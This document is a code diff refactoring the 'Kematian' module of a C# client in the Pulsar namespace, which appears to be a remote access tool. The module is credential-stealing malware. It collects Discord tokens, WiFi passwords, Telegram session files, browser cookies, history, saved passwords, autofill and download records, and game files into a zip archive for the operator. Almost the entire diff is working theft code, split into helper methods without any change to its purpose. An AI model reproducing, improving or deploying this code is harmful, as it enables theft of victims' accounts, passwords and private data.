@@ -19,220 +19,242 @@ namespace Pulsar.Client.Kematian
         {
             byte[] data = null;
             
-            if (client != null)
-                client.Send(new SetStatus { Message = "Kematian - Started retrieving" });
+            client?.Send(new SetStatus { Message = "Kematian - Started retrieving" });
             
             using (var memoryStream = new MemoryStream())
             {
                 using (var archive = new ZipArchive(memoryStream, ZipArchiveMode.Create, true))
                 {
-                    if (client != null)
-                        client.Send(new SetStatus { Message = "Kematian - 5%" });
+                    client?.Send(new SetStatus { Message = "Kematian - 5%" });
                     
                     var retriever = new BrowsersRetriever();
-
-                    if (client != null)
-                        client.Send(new SetStatus { Message = "Kematian - 15%" });
+                    client?.Send(new SetStatus { Message = "Kematian - 15%" });
                     
                     var browsers = retriever.GetBrowserList();
+                    client?.Send(new SetStatus { Message = "Kematian - 25%" });
                     
-                    if (client != null)
-                        client.Send(new SetStatus { Message = "Kematian - 25%" });
+                    ProcessHelperModules(archive, client);
+                    client?.Send(new SetStatus { Message = "Kematian - 40%" });
                     
-                    var textMethods = new KeyValuePair<Func<string>, string>[]
-                    {
-                        new KeyValuePair<Func<string>, string>(GetTokens.Tokens, "Discord\\tokens.txt"),
-                        new KeyValuePair<Func<string>, string>(GetWifis.Passwords, "Wifi\\Wifi.txt"),
-                        new KeyValuePair<Func<string>, string>(TelegramRetriever.GetTelegramSessions, "Telegram\\sessions.txt")
-                    };
-
-                    if (client != null)
-                        client.Send(new SetStatus { Message = "Kematian - 30%" });
-                        
-                    foreach (var methodPair in textMethods)
-                    {
-                        try
-                        {
-                            var content = methodPair.Key();
-                            var zipEntry = archive.CreateEntry(methodPair.Value);
-                            using (var entryStream = new BufferedStream(zipEntry.Open()))
-                            using (var streamWriter = new StreamWriter(entryStream))
-                            {
-                                streamWriter.Write(content);
-                            }
-                        }
-                        catch (Exception ex)
-                        {
-                            Debug.WriteLine($"Error processing {methodPair.Value}: {ex.Message}");
-                        }
-                    }
-
-                    if (client != null)
-                        client.Send(new SetStatus { Message = "Kematian - 40%" });
-
-                    try
-                    {
-                        int browserCount = browsers.Count;
-                        int currentBrowser = 0;
-                        
-                        foreach (var browser in browsers)
-                        {
-                            currentBrowser++;
-                            int browserProgress = 40 + (currentBrowser * 40 / browserCount);
-                            if (client != null)
-                                client.Send(new SetStatus { Message = $"Kematian - {browserProgress}%" });
-                                
-                            string browserName = browser.Name;
-                            try
-                            {
-                                var content = retriever.GetCookiesForBrowser(browser);
-                                if (!string.IsNullOrEmpty(content))
-                                {
-                                    var zipEntry = archive.CreateEntry($"Browsers\\{browserName}\\cookies_netscape.txt");
-                                    using (var entryStream = new BufferedStream(zipEntry.Open()))
-                                    using (var streamWriter = new StreamWriter(entryStream))
-                                    {
-                                        streamWriter.Write(content);
-                                    }
-                                }
-                            }
-                            catch (Exception ex)
-                            {
-                                Debug.WriteLine($"Error processing cookies for {browserName}: {ex.Message}");
-                            }
-
-                            try
-                            {
-                                var content = retriever.GetHistoryForBrowser(browser);
-                                if (!string.IsNullOrEmpty(content) && content != "[]")
-                                {
-                                    var zipEntry = archive.CreateEntry($"Browsers\\{browserName}\\history.json");
-                                    using (var entryStream = new BufferedStream(zipEntry.Open()))
-                                    using (var streamWriter = new StreamWriter(entryStream))
-                                    {
-                                        streamWriter.Write(content);
-                                    }
-                                }
-                            }
-                            catch (Exception ex)
-                            {
-                                Debug.WriteLine($"Error processing history for {browserName}: {ex.Message}");
-                            }
-
-                            try
-                            {
-                                var content = retriever.GetPasswordsForBrowser(browser);
-                                if (!string.IsNullOrEmpty(content) && content != "[]")
-                                {
-                                    var zipEntry = archive.CreateEntry($"Browsers\\{browserName}\\passwords.json");
-                                    using (var entryStream = new BufferedStream(zipEntry.Open()))
-                                    using (var streamWriter = new StreamWriter(entryStream))
-                                    {
-                                        streamWriter.Write(content);
-                                    }
-                                }
-                            }
-                            catch (Exception ex)
-                            {
-                                Debug.WriteLine($"Error processing passwords for {browserName}: {ex.Message}");
-                            }
-
-
-                            if (browser.IsChromium || browser.IsGecko)
-                            {
-                                try
-                                {
-                                    var content = retriever.GetAutoFillForBrowser(browser);
-                                    if (!string.IsNullOrEmpty(content) && content != "[]")
-                                    {
-                                        var zipEntry = archive.CreateEntry($"Browsers\\{browserName}\\autofill.json");
-                                        using (var entryStream = new BufferedStream(zipEntry.Open()))
-                                        using (var streamWriter = new StreamWriter(entryStream))
-                                        {
-                                            streamWriter.Write(content);
-                                        }
-                                    }
-                                }
-                                catch (Exception ex)
-                                {
-                                    Debug.WriteLine($"Error processing autofill for {browserName}: {ex.Message}");
-                                }
-                            }
-
-                            if (browser.IsChromium || browser.IsGecko)
-                            {
-                                try
-                                {
-                                    var content = retriever.GetDownloadsForBrowser(browser);
-                                    if (!string.IsNullOrEmpty(content) && content != "[]")
-                                    {
-                                        var zipEntry = archive.CreateEntry($"Browsers\\{browserName}\\downloads.json");
-                                        using (var entryStream = new BufferedStream(zipEntry.Open()))
-                                        using (var streamWriter = new StreamWriter(entryStream))
-                                        {
-                                            streamWriter.Write(content);
-                                        }
-                                    }
-                                }
-                                catch (Exception ex)
-                                {
-                                    Debug.WriteLine($"Error processing downloads for {browserName}: {ex.Message}");
-                                }
-                            }
-                        }
-                    }
-                    catch (Exception ex)
-                    {
-                        Debug.WriteLine($"Error processing browser data: {ex.Message}");
-                    }
-
-                    if (client != null)
-                        client.Send(new SetStatus { Message = "Kematian - 80%" });
-
-                    try
-                    {
-                        var telegramFiles = TelegramRetriever.GetTelegramSessionFiles();
-                        foreach (var file in telegramFiles)
-                        {
-                            var zipEntry = archive.CreateEntry(file.Key);
-                            using (var entryStream = new BufferedStream(zipEntry.Open()))
-                            {
-                                entryStream.Write(file.Value, 0, file.Value.Length);
-                            }
-                        }
-                    }
-                    catch (Exception ex)
-                    {
-                        Debug.WriteLine($"Error processing Telegram session files: {ex.Message}");
-                    }
-
-                    if (client != null)
-                        client.Send(new SetStatus { Message = "Kematian - 90%" });
-
-                    try
-                    {
-                        var gameFiles = GamesRetriever.GetGameFiles();
-                        foreach (var file in gameFiles)
-                        {
-                            var zipEntry = archive.CreateEntry(file.Key);
-                            using (var entryStream = new BufferedStream(zipEntry.Open()))
-                            {
-                                entryStream.Write(file.Value, 0, file.Value.Length);
-                            }
-                        }
-                    }
-                    catch (Exception ex)
-                    {
-                        Debug.WriteLine($"Error processing game files: {ex.Message}");
-                    }
+                    ProcessBrowserData(archive, browsers, retriever, client);
+                    client?.Send(new SetStatus { Message = "Kematian - 80%" });
+                    
+                    ProcessTelegramData(archive);
+                    client?.Send(new SetStatus { Message = "Kematian - 90%" });
+                    
+                    ProcessGameData(archive);
                 }
                 data = memoryStream.ToArray();
             }
             
-            if (client != null)
-                client.Send(new SetStatus { Message = "Kematian - Finished!" });
-                
+            client?.Send(new SetStatus { Message = "Kematian - Finished!" });
             return data;
+        }
+        
+        private static void ProcessHelperModules(ZipArchive archive, ISender client)
+        {
+            var textMethods = new KeyValuePair<Func<string>, string>[]
+            {
+                new KeyValuePair<Func<string>, string>(GetTokens.Tokens, "Discord\\tokens.txt"),
+                new KeyValuePair<Func<string>, string>(GetWifis.Passwords, "Wifi\\Wifi.txt"),
+                new KeyValuePair<Func<string>, string>(TelegramRetriever.GetTelegramSessions, "Telegram\\sessions.txt")
+            };
+
+            foreach (var methodPair in textMethods)
+            {
+                try
+                {
+                    var content = methodPair.Key();
+                    var zipEntry = archive.CreateEntry(methodPair.Value);
+                    using (var entryStream = new BufferedStream(zipEntry.Open()))
+                    using (var streamWriter = new StreamWriter(entryStream))
+                    {
+                        streamWriter.Write(content);
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Debug.WriteLine($"Error processing {methodPair.Value}: {ex.Message}");
+                }
+            }
+        }
+        
+        private static void ProcessBrowserData(ZipArchive archive, List<BrowserInfo> browsers, BrowsersRetriever retriever, ISender client)
+        {
+            try
+            {
+                int browserCount = browsers.Count;
+                int currentBrowser = 0;
+                
+                foreach (var browser in browsers)
+                {
+                    currentBrowser++;
+                    int browserProgress = 40 + (currentBrowser * 40 / browserCount);
+                    client?.Send(new SetStatus { Message = $"Kematian - {browserProgress}%" });
+                    
+                    ProcessBrowserCookies(archive, browser, retriever);
+                    ProcessBrowserHistory(archive, browser, retriever);
+                    ProcessBrowserPasswords(archive, browser, retriever);
+                    
+                    switch (browser.Type)
+                    {
+                        case "Chromium":
+                        case "Gecko":
+                            ProcessBrowserAutofill(archive, browser, retriever);
+                            ProcessBrowserDownloads(archive, browser, retriever);
+                            break;
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error processing browser data: {ex.Message}");
+            }
+        }
+        
+        private static void ProcessBrowserCookies(ZipArchive archive, BrowserInfo browser, BrowsersRetriever retriever)
+        {
+            try
+            {
+                var content = retriever.GetCookiesForBrowser(browser);
+                if (!string.IsNullOrEmpty(content))
+                {
+                    var zipEntry = archive.CreateEntry($"Browsers\\{browser.Name}\\cookies_netscape.txt");
+                    using (var entryStream = new BufferedStream(zipEntry.Open()))
+                    using (var streamWriter = new StreamWriter(entryStream))
+                    {
+                        streamWriter.Write(content);
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error processing cookies for {browser.Name}: {ex.Message}");
+            }
+        }
+        
+        private static void ProcessBrowserHistory(ZipArchive archive, BrowserInfo browser, BrowsersRetriever retriever)
+        {
+            try
+            {
+                var content = retriever.GetHistoryForBrowser(browser);
+                if (!string.IsNullOrEmpty(content) && content != "[]")
+                {
+                    var zipEntry = archive.CreateEntry($"Browsers\\{browser.Name}\\history.json");
+                    using (var entryStream = new BufferedStream(zipEntry.Open()))
+                    using (var streamWriter = new StreamWriter(entryStream))
+                    {
+                        streamWriter.Write(content);
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error processing history for {browser.Name}: {ex.Message}");
+            }
+        }
+        
+        private static void ProcessBrowserPasswords(ZipArchive archive, BrowserInfo browser, BrowsersRetriever retriever)
+        {
+            try
+            {
+                var content = retriever.GetPasswordsForBrowser(browser);
+                if (!string.IsNullOrEmpty(content) && content != "[]")
+                {
+                    var zipEntry = archive.CreateEntry($"Browsers\\{browser.Name}\\passwords.json");
+                    using (var entryStream = new BufferedStream(zipEntry.Open()))
+                    using (var streamWriter = new StreamWriter(entryStream))
+                    {
+                        streamWriter.Write(content);
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error processing passwords for {browser.Name}: {ex.Message}");
+            }
+        }
+        
+        private static void ProcessBrowserAutofill(ZipArchive archive, BrowserInfo browser, BrowsersRetriever retriever)
+        {
+            try
+            {
+                var content = retriever.GetAutoFillForBrowser(browser);
+                if (!string.IsNullOrEmpty(content) && content != "[]")
+                {
+                    var zipEntry = archive.CreateEntry($"Browsers\\{browser.Name}\\autofill.json");
+                    using (var entryStream = new BufferedStream(zipEntry.Open()))
+                    using (var streamWriter = new StreamWriter(entryStream))
+                    {
+                        streamWriter.Write(content);
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error processing autofill for {browser.Name}: {ex.Message}");
+            }
+        }
+        
+        private static void ProcessBrowserDownloads(ZipArchive archive, BrowserInfo browser, BrowsersRetriever retriever)
+        {
+            try
+            {
+                var content = retriever.GetDownloadsForBrowser(browser);
+                if (!string.IsNullOrEmpty(content) && content != "[]")
+                {
+                    var zipEntry = archive.CreateEntry($"Browsers\\{browser.Name}\\downloads.json");
+                    using (var entryStream = new BufferedStream(zipEntry.Open()))
+                    using (var streamWriter = new StreamWriter(entryStream))
+                    {
+                        streamWriter.Write(content);
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error processing downloads for {browser.Name}: {ex.Message}");
+            }
+        }
+        
+        private static void ProcessTelegramData(ZipArchive archive)
+        {
+            try
+            {
+                var telegramFiles = TelegramRetriever.GetTelegramSessionFiles();
+                foreach (var file in telegramFiles)
+                {
+                    var zipEntry = archive.CreateEntry(file.Key);
+                    using (var entryStream = new BufferedStream(zipEntry.Open()))
+                    {
+                        entryStream.Write(file.Value, 0, file.Value.Length);
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error processing Telegram session files: {ex.Message}");
+            }
+        }
+        
+        private static void ProcessGameData(ZipArchive archive)
+        {
+            try
+            {
+                var gameFiles = GamesRetriever.GetGameFiles();
+                foreach (var file in gameFiles)
+                {
+                    var zipEntry = archive.CreateEntry(file.Key);
+                    using (var entryStream = new BufferedStream(zipEntry.Open()))
+                    {
+                        entryStream.Write(file.Value, 0, file.Value.Length);
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error processing game files: {ex.Message}");
+            }
         }
     }
 }
